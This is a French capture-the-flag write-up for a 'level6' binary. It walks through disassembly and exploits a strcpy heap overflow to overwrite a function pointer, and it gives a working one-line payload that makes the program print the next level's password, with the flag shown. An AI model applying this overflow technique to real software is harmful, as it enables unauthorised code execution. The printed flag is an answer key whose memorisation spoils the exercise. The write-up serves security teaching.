#	Cette fois si l'executable prend un argument sinon il segfault. Quelque soit l'argument il ecrira "Nope".

#	Regardons le code:

$> objdump -d level6
[...]
08048454 <n>:
 8048454:	55                   	push   %ebp
 8048455:	89 e5                	mov    %esp,%ebp
 8048457:	83 ec 18             	sub    $0x18,%esp
 804845a:	c7 04 24 b0 85 04 08 	movl   $0x80485b0,(%esp)
 8048461:	e8 0a ff ff ff       	call   8048370 <system@plt>	<--	system("/bin/cat /home/user/level7/.pass")
 8048466:	c9                   	leave
 8048467:	c3                   	ret							<--	return

08048468 <m>:
 8048468:	55                   	push   %ebp
 8048469:	89 e5                	mov    %esp,%ebp
 804846b:	83 ec 18             	sub    $0x18,%esp
 804846e:	c7 04 24 d1 85 04 08 	movl   $0x80485d1,(%esp)
 8048475:	e8 e6 fe ff ff       	call   8048360 <puts@plt>	<--	puts("Nope");
 804847a:	c9                   	leave
 804847b:	c3                   	ret							<--	return

0804847c <main>:
 804847c:	55                   	push   %ebp
 804847d:	89 e5                	mov    %esp,%ebp
 804847f:	83 e4 f0             	and    $0xfffffff0,%esp
 8048482:	83 ec 20             	sub    $0x20,%esp			<--	alloc de 32
 8048485:	c7 04 24 40 00 00 00 	movl   $0x40,(%esp)
 804848c:	e8 bf fe ff ff       	call   8048350 <malloc@plt>	<--	buff = malloc(64)
 8048491:	89 44 24 1c          	mov    %eax,0x1c(%esp)		|
 8048495:	c7 04 24 04 00 00 00 	movl   $0x4,(%esp)
 804849c:	e8 af fe ff ff       	call   8048350 <malloc@plt>	<--	f = malloc(4)
 80484a1:	89 44 24 18          	mov    %eax,0x18(%esp)		|
 80484a5:	ba 68 84 04 08       	mov    $0x8048468,%edx
 80484aa:	8b 44 24 18          	mov    0x18(%esp),%eax		<--	*f = m;
 80484ae:	89 10                	mov    %edx,(%eax)
 80484b0:	8b 45 0c             	mov    0xc(%ebp),%eax
 80484b3:	83 c0 04             	add    $0x4,%eax
 80484b6:	8b 00                	mov    (%eax),%eax
 80484b8:	89 c2                	mov    %eax,%edx
 80484ba:	8b 44 24 1c          	mov    0x1c(%esp),%eax
 80484be:	89 54 24 04          	mov    %edx,0x4(%esp)
 80484c2:	89 04 24             	mov    %eax,(%esp)
 80484c5:	e8 76 fe ff ff       	call   8048340 <strcpy@plt>	<--	strcpy(buff, av[1])
 80484ca:	8b 44 24 18          	mov    0x18(%esp),%eax
 80484ce:	8b 00                	mov    (%eax),%eax
 80484d0:	ff d0                	call   *%eax				<--	call(f);
 80484d2:	c9                   	leave
 80484d3:	c3                   	ret
 80484d4:	90                   	nop
 80484d5:	90                   	nop
 80484d6:	90                   	nop
 80484d7:	90                   	nop
 80484d8:	90                   	nop
 80484d9:	90                   	nop
 80484da:	90                   	nop
 80484db:	90                   	nop
 80484dc:	90                   	nop
 80484dd:	90                   	nop
 80484de:	90                   	nop
 80484df:	90                   	nop
[...]

#	Le segfault vient du strcpy, il est possible de le faire segfault egalement en creant un buffer overflow, buff a une taille de 64, en tatonnant un peu on remarque que le segfault arrive a partir du moment ou av[1] a une taille de 72.

#	Grace a ce buffer overflow on va pouvoir modifier la valeur de *f en memoire qui se situe juste derriere sur la stack (buff 0x1c, f 0x18). On va la modifier par l'adresse de n qui fait un appel systeme affichant le flag suivant: 0x8048454

$> ./level6 `python -c 'print 72*"A" + "\x54\x84\x04\x08"'`
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
